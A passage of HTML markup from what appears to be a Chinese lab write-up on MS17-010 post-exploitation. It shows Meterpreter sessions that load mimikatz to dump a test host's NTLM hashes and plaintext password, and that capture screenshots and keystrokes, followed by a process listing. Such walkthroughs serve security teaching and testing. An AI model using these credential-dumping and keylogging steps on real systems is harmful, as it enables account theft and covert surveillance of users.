+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; load kiwi
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Loading extension kiwi...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .#####. mimikatz 2.2.0 &lt;span class="m"&gt;20191125&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;x64/windows&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .## ^ &lt;span class="c1"&gt;##. &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34; - (oe.eo)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;## \ / ## &amp;gt; http://blog.gentilkiwi.com/mimikatz&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;## v ##&amp;#39;&lt;/span&gt; Vincent LE TOUX &lt;span class="o"&gt;(&lt;/span&gt; vincent.letoux@gmail.com &lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;#####&amp;#39;&lt;/span&gt; &amp;gt; http://pingcastle.com / http://mysmartlogon.com ***/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Success.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; creds_all
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Running as SYSTEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Retrieving all credentials
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msv &lt;span class="nv"&gt;credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain LM NTLM SHA1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ -- ---- ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC 44efce164ab921caa 32ed87bdb5fdc5e9c 6ed5833cf35286ebf8
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ad3b435b51404ee ba88547376818d4 662b7b5949f0d742bb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ec3f
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wdigest &lt;span class="nv"&gt;credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ANKH-PC$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tspkg &lt;span class="nv"&gt;credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;=================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;kerberos &lt;span class="nv"&gt;credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;====================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ankh-pc$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：在Win7中，攻击者通常能够直接看到&lt;strong&gt;Password&lt;/strong&gt;一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。&lt;/p&gt;
+&lt;h4 id="二隐私监控与取证monitoring"&gt;二、隐私监控与取证（Monitoring）
+&lt;/h4&gt;&lt;h5 id="1实时屏幕截图"&gt;1、实时屏幕截图
+&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; screenshot
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Screenshot saved to: /root/ZuMWyRDh.jpeg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png"
+width="860"
+height="618"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_678321c30ae0e7d.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_7ac598bae94a8f45.png 1024w"
+loading="lazy"
+alt="7"
+class="gallery-image"
+data-flex-grow="139"
+data-flex-basis="333px"
+&gt;&lt;/p&gt;
+&lt;h5 id="2-键盘记录keylogging"&gt;2. 键盘记录（Keylogging）
+&lt;/h5&gt;&lt;p&gt;如果当前是System权限则切换到用户权限 -&amp;gt; &lt;code&gt;keyscan_start # 开启键盘监听&lt;/code&gt; -&amp;gt; Ankh用户输入&lt;code&gt;Hello?&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_dump # Kali屏幕输出记录下的按键&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_stop # 停止监听&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt; 10
+&lt;/span&gt;&lt;span class="lnt"&gt; 11
+&lt;/span&gt;&lt;span class="lnt"&gt; 12
+&lt;/span&gt;&lt;span class="lnt"&gt; 13
+&lt;/span&gt;&lt;span class="lnt"&gt; 14
+&lt;/span&gt;&lt;span class="lnt"&gt; 15
+&lt;/span&gt;&lt;span class="lnt"&gt; 16
+&lt;/span&gt;&lt;span class="lnt"&gt; 17
+&lt;/span&gt;&lt;span class="lnt"&gt; 18
+&lt;/span&gt;&lt;span class="lnt"&gt; 19
+&lt;/span&gt;&lt;span class="lnt"&gt; 20
+&lt;/span&gt;&lt;span class="lnt"&gt; 21
+&lt;/span&gt;&lt;span class="lnt"&gt; 22
+&lt;/span&gt;&lt;span class="lnt"&gt; 23
+&lt;/span&gt;&lt;span class="lnt"&gt; 24
+&lt;/span&gt;&lt;span class="lnt"&gt; 25
+&lt;/span&gt;&lt;span class="lnt"&gt; 26
+&lt;/span&gt;&lt;span class="lnt"&gt; 27
+&lt;/span&gt;&lt;span class="lnt"&gt; 28
+&lt;/span&gt;&lt;span class="lnt"&gt; 29
+&lt;/span&gt;&lt;span class="lnt"&gt; 30
+&lt;/span&gt;&lt;span class="lnt"&gt; 31
+&lt;/span&gt;&lt;span class="lnt"&gt; 32
+&lt;/span&gt;&lt;span class="lnt"&gt; 33
+&lt;/span&gt;&lt;span class="lnt"&gt; 34
+&lt;/span&gt;&lt;span class="lnt"&gt; 35
+&lt;/span&gt;&lt;span class="lnt"&gt; 36
+&lt;/span&gt;&lt;span class="lnt"&gt; 37
+&lt;/span&gt;&lt;span class="lnt"&gt; 38
+&lt;/span&gt;&lt;span class="lnt"&gt; 39
+&lt;/span&gt;&lt;span class="lnt"&gt; 40
+&lt;/span&gt;&lt;span class="lnt"&gt; 41
+&lt;/span&gt;&lt;span class="lnt"&gt; 42
+&lt;/span&gt;&lt;span class="lnt"&gt; 43
+&lt;/span&gt;&lt;span class="lnt"&gt; 44
+&lt;/span&gt;&lt;span class="lnt"&gt; 45
+&lt;/span&gt;&lt;span class="lnt"&gt; 46
+&lt;/span&gt;&lt;span class="lnt"&gt; 47
+&lt;/span&gt;&lt;span class="lnt"&gt; 48
+&lt;/span&gt;&lt;span class="lnt"&gt; 49
+&lt;/span&gt;&lt;span class="lnt"&gt; 50
+&lt;/span&gt;&lt;span class="lnt"&gt; 51
+&lt;/span&gt;&lt;span class="lnt"&gt; 52
+&lt;/span&gt;&lt;span class="lnt"&gt; 53
+&lt;/span&gt;&lt;span class="lnt"&gt; 54
+&lt;/span&gt;&lt;span class="lnt"&gt; 55
+&lt;/span&gt;&lt;span class="lnt"&gt; 56
+&lt;/span&gt;&lt;span class="lnt"&gt; 57
+&lt;/span&gt;&lt;span class="lnt"&gt; 58
+&lt;/span&gt;&lt;span class="lnt"&gt; 59
+&lt;/span&gt;&lt;span class="lnt"&gt; 60
+&lt;/span&gt;&lt;span class="lnt"&gt; 61
+&lt;/span&gt;&lt;span class="lnt"&gt; 62
+&lt;/span&gt;&lt;span class="lnt"&gt; 63
+&lt;/span&gt;&lt;span class="lnt"&gt; 64
+&lt;/span&gt;&lt;span class="lnt"&gt; 65
+&lt;/span&gt;&lt;span class="lnt"&gt; 66
+&lt;/span&gt;&lt;span class="lnt"&gt; 67
+&lt;/span&gt;&lt;span class="lnt"&gt; 68
+&lt;/span&gt;&lt;span class="lnt"&gt; 69
+&lt;/span&gt;&lt;span class="lnt"&gt; 70
+&lt;/span&gt;&lt;span class="lnt"&gt; 71
+&lt;/span&gt;&lt;span class="lnt"&gt; 72
+&lt;/span&gt;&lt;span class="lnt"&gt; 73
+&lt;/span&gt;&lt;span class="lnt"&gt; 74
+&lt;/span&gt;&lt;span class="lnt"&gt; 75
+&lt;/span&gt;&lt;span class="lnt"&gt; 76
+&lt;/span&gt;&lt;span class="lnt"&gt; 77
+&lt;/span&gt;&lt;span class="lnt"&gt; 78
+&lt;/span&gt;&lt;span class="lnt"&gt; 79
+&lt;/span&gt;&lt;span class="lnt"&gt; 80
+&lt;/span&gt;&lt;span class="lnt"&gt; 81
+&lt;/span&gt;&lt;span class="lnt"&gt; 82
+&lt;/span&gt;&lt;span class="lnt"&gt; 83
+&lt;/span&gt;&lt;span class="lnt"&gt; 84
+&lt;/span&gt;&lt;span class="lnt"&gt; 85
+&lt;/span&gt;&lt;span class="lnt"&gt; 86
+&lt;/span&gt;&lt;span class="lnt"&gt; 87
+&lt;/span&gt;&lt;span class="lnt"&gt; 88
+&lt;/span&gt;&lt;span class="lnt"&gt; 89
+&lt;/span&gt;&lt;span class="lnt"&gt; 90
+&lt;/span&gt;&lt;span class="lnt"&gt; 91
+&lt;/span&gt;&lt;span class="lnt"&gt; 92
+&lt;/span&gt;&lt;span class="lnt"&gt; 93
+&lt;/span&gt;&lt;span class="lnt"&gt; 94
+&lt;/span&gt;&lt;span class="lnt"&gt; 95
+&lt;/span&gt;&lt;span class="lnt"&gt; 96
+&lt;/span&gt;&lt;span class="lnt"&gt; 97
+&lt;/span&gt;&lt;span class="lnt"&gt; 98
+&lt;/span&gt;&lt;span class="lnt"&gt; 99
+&lt;/span&gt;&lt;span class="lnt"&gt;100
+&lt;/span&gt;&lt;span class="lnt"&gt;101
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid &lt;span class="c1"&gt;# 查看当前权限：SYSTEM&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; ps &lt;span class="c1"&gt;# 查看进程列表，Session 1通常代表用户&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Process &lt;span class="nv"&gt;List&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;============&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; PID PPID Name Arch Session User Path
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --- ---- ---- ---- ------- ---- ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;System Pr
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ocess&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; System x64 &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;268&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; smss.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS &lt;span class="se"&gt;\S&lt;/span&gt;ystemRoot&lt;span class="se"&gt;\S&lt;/span&gt;yste
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM m32&lt;span class="se"&gt;\s&lt;/span&gt;mss.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;312&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;344&lt;/span&gt; &lt;span class="m"&gt;328&lt;/span&gt; csrss.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;srss.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;360&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; SearchInde x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xer.exe TEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;392&lt;/span&gt; &lt;span class="m"&gt;328&lt;/span&gt; wininit.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\w&lt;/span&gt;ininit.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;404&lt;/span&gt; &lt;span class="m"&gt;384&lt;/span&gt; csrss.exe x64 &lt;span class="m"&gt;1&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;srss.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;448&lt;/span&gt; &lt;span class="m"&gt;384&lt;/span&gt; winlogon.e x64 &lt;span class="m"&gt;1&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe TEM 32&lt;span class="se"&gt;\w&lt;/span&gt;inlogon.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;484&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; services.e x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe TEM 32&lt;span class="se"&gt;\s&lt;/span&gt;ervices.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;500&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; lsass.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\l&lt;/span&gt;sass.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;508&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; lsm.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\l&lt;/span&gt;sm.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;620&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;696&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;760&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;836&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;868&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;988&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1052&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; spoolsv.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\S&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\s&lt;/span&gt;poolsv.exe
